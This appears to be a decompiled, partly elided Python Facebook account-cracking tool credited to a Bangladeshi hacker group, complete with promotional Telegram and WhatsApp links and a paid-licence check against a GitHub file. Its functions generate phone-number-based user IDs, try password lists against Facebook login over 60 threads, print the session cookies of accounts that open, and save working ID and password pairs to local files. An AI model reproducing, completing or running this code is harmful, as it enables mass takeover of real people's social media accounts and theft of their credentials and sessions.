#---------------------[ INFO ]---------------------#
#DECOMPILE  BY GAZIPUR CYBER HACKER GROUP
#JOIN : https://t.me/bdtiktokreels
#JOIN : https://t.me/bdtiktokreels
#---------------------[MODULES ]---------------------#
...
\x1b[38;5;46m🥰🥰🥰🥰🥰AZHARUL ISLAM (SHANTO)🥰🥰🥰🥰🥰
...
\x1b[38;5;46m🥰🥰🥰🥰🥰 GAZIPUR HACKER GROUP 🥰🥰🥰🥰🥰
...
def Main():
	...
	if opt in ["C","3"]:
		...
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://t.me/bdtiktokreels');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801770168164');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=shanto.sathy/');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://t.me/bdtiktokreels');time.sleep(1)
		admin()
...
def virusA():
	...
	print(" ┏━[•] INDIA SIM CODE +9163 +9170 +9178 +9196 +9194")
	kode = input(' ┗━[+] SELECT : ')
	doamin = ' BD Number id cloner [ONLY-OK] '
	print(' ┏━[•] EXAMPLE : 1000,5000,10000,15000,20000,30000,50000] ')
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print('\033[1;97m┗━[•] \033[1;92mSTART BD/INDIA NAMBER MIXT CRACKING... ')
		print(50*'━')
		for guru in user:
	...
	print(' [💉] Ids saved in shanto.ok.txt,shanto.cp.txt')
	print(50*'_')
	exit()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[SHANTO]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [SHANTO-OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/SHANTO-shanto.ok.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Shano8164/CONTROL-GITHUB/blob/main/Aproval.tex").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        os.system("xdg-open https://t.me/bdtiktokreels")
        time.sleep(3.0)
        ...
        print ("")
        print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│   That is Painding because 100% ok id just now login│\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
        print ("")
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am SHANTO VAI er  ROBOT and my boss is shanto.Sir this tool is paid because 100% ok id just now login\"")
        name = input(" Your Name : ")
        os.system(f"espeak \"{name} ,prass Enter to send your key\"")
        print ("")
        input(" Press Enter To Send Key")
        os.system("xdg-open https://www.facebook.com/profile.php?id=shanto.sathy")
        superuser()        
superuser()
